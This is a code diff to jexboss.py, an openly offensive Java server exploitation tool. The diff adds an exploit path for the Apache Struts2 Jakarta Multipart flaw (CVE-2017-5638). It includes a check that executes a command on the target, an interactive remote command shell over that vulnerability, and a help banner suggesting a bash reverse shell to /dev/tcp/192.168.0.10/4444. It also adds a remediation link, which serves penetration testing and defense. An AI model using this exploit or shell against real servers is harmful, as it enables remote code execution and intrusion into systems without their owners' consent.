@@ -38,7 +38,7 @@ FORMAT = "%(asctime)s (%(levelname)s): %(message)s"
 logging.basicConfig(filename='jexboss_'+str(datetime.datetime.today().date())+'.log', format=FORMAT, level=logging.INFO)
 
 __author__ = "João Filho Matos Figueiredo <joaomatosf@gmail.com>"
-__version__ = "1.2.0"
+__version__ = "1.2.1"
 
 RED = '\x1b[91m'
 RED1 = '\033[31m'
@@ -238,6 +238,7 @@ def check_vul(url):
              "Application Deserialization": "",
              "Servlet Deserialization" : "",
              "Jenkins": "",
+             "Struts2": "",
              "JMX Tomcat" : ""}
 
     fatal_error = False
@@ -252,6 +253,8 @@ def check_vul(url):
                     (not gl_args.jmxtomcat and vector == 'JMX Tomcat'): continue
 
             if gl_args.app_unserialize and vector != 'Application Deserialization': continue
+
+            if gl_args.struts2 and vector != 'Struts2': continue
 
             if gl_args.servlet_unserialize and vector != 'Servlet Deserialization': continue
 
@@ -340,6 +343,16 @@ def check_vul(url):
                     r = gl_http_pool.request('GET', url, redirect=True, headers=headers)
 
                 if 'x-java-serialized-object' in r.getheader('Content-Type'):
+                    paths[vector] = 200
+                else:
+                    paths[vector] = 505
+
+            elif vector == 'Struts2':
+
+                result = _exploits.exploit_struts2_jakarta_multipart(url, 'jexboss')
+                if result is None or "Could not get command" in str(result) :
+                    paths[vector] = 100
+                elif 'jexboss' in str(result) and "<html>" not in str(result).lower():
                     paths[vector] = 200
                 else:
                     paths[vector] = 505
@@ -564,6 +577,10 @@ def auto_exploit(url, exploit_type):
         result = _exploits.exploit_servlet_deserialization(url, host=host, port=port, cmd=gl_args.cmd, is_win=gl_args.windows,
                                                                gadget=gl_args.gadget, gadget_file=gl_args.load_gadget)
 
+    elif exploit_type == "Struts2":
+
+        result = 200
+
     # if it seems to be exploited (201 is for jboss exploited with gadget)
     if result == 200 or result == 500 or result == 201:
 
@@ -578,8 +595,11 @@ def auto_exploit(url, exploit_type):
                 input().lower() if version_info[0] >= 3 else raw_input().lower()
                 return True
             else:
-                print_and_flush(GREEN + " * Successfully deployed code! Starting command shell. Please wait...\n" + ENDC)
-                shell_http(url, exploit_type)
+                if exploit_type == 'Struts2':
+                    shell_http_struts(url)
+                else:
+                    print_and_flush(GREEN + " * Successfully deployed code! Starting command shell. Please wait...\n" + ENDC)
+                    shell_http(url, exploit_type)
 
         # if auto exploit mode, print message and continue...
         else:
@@ -647,6 +667,42 @@ def get_host_port_reverse_params():
         host, port = None, None
 
     return host, port
+
+
+def shell_http_struts(url):
+    """
+    Connect to an HTTP shell
+    :param url: struts app url
+    :param shell_type: The type of shell to connect to
+    """
+    print_and_flush("# ----------------------------------------- #\n")
+    print_and_flush(GREEN + BOLD + " * For a Reverse Shell (like meterpreter =]), type sometime like: \n\n"
+                    "\n" +ENDC+
+                    "     Shell>/bin/bash -i > /dev/tcp/192.168.0.10/4444 0>&1 2>&1\n"
+                    "   \n"+GREEN+
+                    "   And so on... =]\n" +ENDC
+                    )
+    print_and_flush("# ----------------------------------------- #\n")
+
+    resp = _exploits.exploit_struts2_jakarta_multipart(url,'whoami')
+
+    print_and_flush(resp.replace('\\n', '\n'), same_line=True)
+    logging.info("Server %s exploited!" %url)
+
+    while 1:
+        print_and_flush(BLUE + "[Type commands or \"exit\" to finish]" +ENDC)
+
+        if not sys.stdout.isatty():
+            print_and_flush("Shell> ", same_line=True)
+            cmd = input() if version_info[0] >= 3 else raw_input()
+        else:
+            cmd = input("Shell> ") if version_info[0] >= 3 else raw_input("Shell> ")
+
+        if cmd == "exit":
+            break
+
+        resp = _exploits.exploit_struts2_jakarta_multipart(url, cmd)
+        print_and_flush(resp.replace('\\n', '\n'))
 
 
 # FIX: capture the readtimeout   File "jexboss.py", line 333, in shell_http
@@ -782,6 +838,9 @@ def help_usage():
 
      BLUE + "\n\n For Jenkins CLI Deserialization Vulnerabilitie:\n"+
      GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/jenkins --jenkins"+
+
+     BLUE + "\n\n For Apache Struts2 Vulnerabilities (CVE-2017-5638):\n" +
+     GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/path.action --struts2\n" +
 
      BLUE + "\n\n For auto scan mode, you must provide the network in CIDR format, "
    "\n list of ports and filename for store results:\n" +
@@ -945,6 +1004,7 @@ def main():
                       " - For a quick (but not definitive) remediation for the viewState input, store the state \n"
                       "   of the view components on the server (this will increase the heap memory consumption): \n"
                       "      In web.xml, change the \"client\" parameter to \"server\" on STATE_SAVING_METHOD.\n"
+                      " - Upgrade Apache Struts: https://cwiki.apache.org/confluence/display/WW/S2-045\n"
                       "\n References:\n"
                       "   [1] - https://developer.jboss.org/wiki/SecureTheJmxConsole\n"
                       "   [2] - https://issues.jboss.org/secure/attachment/12313982/jboss-securejmx.pdf\n"
@@ -1011,6 +1071,7 @@ if __name__ == "__main__":
                         action='store_true')
     parser.add_argument("--jboss", help="Check only for JBOSS vectors.", action='store_true')
     parser.add_argument("--jenkins",  help="Check only for Jenkins CLI vector (CVE-2015-5317).", action='store_true')
+    parser.add_argument("--struts2", help="Check only for Struts2 Jakarta Multipart parser (CVE-2017-5638).", action='store_true')
     parser.add_argument("--jmxtomcat", help="Check JMX JmxRemoteLifecycleListener in Tomcat (CVE-2016-8735 and "
                                             "CVE-2016-3427). OBS: Will not be checked by default.", action='store_true')
 
